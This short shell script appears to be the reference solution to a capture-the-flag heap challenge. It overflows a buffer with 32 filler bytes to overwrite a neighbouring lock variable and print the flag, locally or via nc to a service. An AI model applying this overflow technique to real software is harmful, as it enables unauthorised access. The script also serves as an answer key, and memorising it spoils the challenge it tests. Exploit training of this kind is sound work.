#!/bin/sh
# Reference solution (shell form) for demo-heap-0.
# Clobber lock_state (any non-"shut" value wins).
#
# Usage:
#   ./solve.sh               solve a local ./chall  (needs ./chall and ./flag.txt here)
#   ./solve.sh HOST PORT     solve a deployed service over the network, via nc
#
# The payload is: option 2 (write), then 32 filler bytes followed by
# "XXXX" so it lands on the neighbouring variable, then option 4 (print flag).

PAD=$(printf 'A%.0s' $(seq 1 32))
PAYLOAD="${PAD}XXXX"

send() {
	printf '2\n%s\n4\n' "$PAYLOAD"
}

if [ "$#" -ge 2 ]; then
	send | nc "$1" "$2"
else
	send | ./chall
fi
